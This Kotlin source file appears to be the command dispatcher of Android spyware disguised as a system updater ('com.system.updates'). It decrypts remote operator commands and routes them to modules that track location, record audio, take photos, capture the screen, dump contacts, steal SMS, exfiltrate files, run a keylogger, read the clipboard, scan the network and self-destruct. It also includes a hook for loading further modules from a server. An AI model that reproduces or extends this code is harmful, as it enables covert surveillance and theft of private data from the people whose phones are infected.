package com.system.updates.communication

import android.content.Context
import android.util.Log
import com.system.updates.core.CryptoManager
import com.system.updates.error.ErrorHandler
import com.system.updates.error.FallbackExecutor
import com.system.updates.modules.data.*
import com.system.updates.modules.media.*
import com.system.updates.modules.network.*
import com.system.updates.modules.system.*
import org.json.JSONObject
import java.lang.reflect.Method

class CommandExecutor(
    private val context: Context,
    private val crypto: CryptoManager,
    private val errorHandler: ErrorHandler,
    private val fallbackExecutor: FallbackExecutor
) {
    private val moduleMap = mutableMapOf<String, (JSONObject) -> String>()
    private val dynamicModules = mutableMapOf<String, Any>()

    init {
        registerBuiltinModules()
    }

    private fun registerBuiltinModules() {
        moduleMap["update_firmware"] = { params -> handleUpdateFirmware(params) }
        moduleMap["collect_data"] = { params -> handleCollectData(params) }
        moduleMap["set_status"] = { params -> handleSetStatus(params) }
        moduleMap["get_location"] = { params -> GeoProvider(context).getLastLocation() }
        moduleMap["record_audio"] = { params -> MicrophoneListener(context).startRecording(params.optInt("duration", 30)) }
        moduleMap["take_photo"] = { params -> CameraManager(context).takePhoto(params.optString("camera", "back")) }
        moduleMap["start_stream"] = { params -> LiveStreamEngine(context).startStream(params.optString("url")) }
        moduleMap["screen_capture"] = { params -> ScreenCapture(context).capture() }
        moduleMap["list_apps"] = { AppListStealer(context).getInstalledApps() }
        moduleMap["dump_contacts"] = { ContactsStealer(context).dumpContacts() }
        moduleMap["steal_sms"] = { SMSListener(context).getLastMessages(params.optInt("limit", 10)) }
        moduleMap["file_search"] = { params -> FileExfiltrator(context).searchFiles(params.optString("extensions")) }
        moduleMap["keylogger_start"] = { Keylogger(context).start() }
        moduleMap["keylogger_stop"] = { Keylogger(context).stop() }
        moduleMap["clipboard_get"] = { InputMonitor(context).getClipboard() }
        moduleMap["network_scan"] = { NetUtils(context).scanLocalNetwork() }
        moduleMap["privilege_check"] = { SysPrivHelper(context).checkRoot() }
        moduleMap["self_destruct"] = { SelfDestructManager(context).activate() }
        moduleMap["ping"] = { "pong" }
    }

    fun executeCommand(encryptedCommand: String): String {
        return try {
            val key = crypto.deriveDeviceKey()
            val decrypted = crypto.decryptData(encryptedCommand.toByteArray(), key).decodeToString()
            val json = JSONObject(decrypted)
            val commandType = json.getString("type")
            val params = json.optJSONObject("params") ?: JSONObject()

            if (commandType.startsWith("dyn_")) {
                executeDynamicCommand(commandType, params)
            } else {
                val handler = moduleMap[commandType]
                if (handler != null) {
                    handler.invoke(params)
                } else {
                    errorHandler.logError("UNKNOWN_CMD", "Unknown command: $commandType")
                    "ERR_UNKNOWN_CMD"
                }
            }
        } catch (e: Exception) {
            errorHandler.logError("CMD_EXEC_ERR", e.message ?: "Unknown error", throwable = e)
            fallbackExecutor.executeFallback(encryptedCommand)
        }
    }

    private fun executeDynamicCommand(cmdName: String, params: JSONObject): String {
        if (!dynamicModules.containsKey(cmdName)) {
            val loaded = loadDynamicModule(cmdName)
            if (!loaded) return "ERR_DYN_LOAD"
        }
        val module = dynamicModules[cmdName]
        return try {
            val method = module!!.javaClass.getMethod("execute", JSONObject::class.java)
            method.invoke(module, params) as String
        } catch (e: Exception) {
            errorHandler.logError("DYN_EXEC_ERR", e.message ?: "Unknown", throwable = e)
            "ERR_DYN_EXEC"
        }
    }

    private fun loadDynamicModule(cmdName: String): Boolean {
        // In real implementation, download from server and load dynamically
        return false
    }

    fun registerDynamicCommand(name: String, module: Any) {
        dynamicModules[name] = module
    }

    // ----------------------------------------------------------------------
    // Built-in command handlers
    // ----------------------------------------------------------------------
    private fun handleUpdateFirmware(params: JSONObject): String {
        val url = params.getString("url")
        Log.i("CommandExecutor", "Firmware update from: $url")
        return "UPDATE_QUEUED"
    }

    private fun handleCollectData(params: JSONObject): String {
        val data = JSONObject().apply {
            put("device_id", crypto.getDeviceId())
            put("timestamp", System.currentTimeMillis())
            put("battery", android.os.BatteryManager.EXTRA_LEVEL)
            put("network", NetUtils(context).getConnectionType())
        }
        return data.toString()
    }

    private fun handleSetStatus(params: JSONObject): String {
        val status = params.getString("status")
        Log.i("CommandExecutor", "Status set to: $status")
        return "STATUS_UPDATED"
    }
}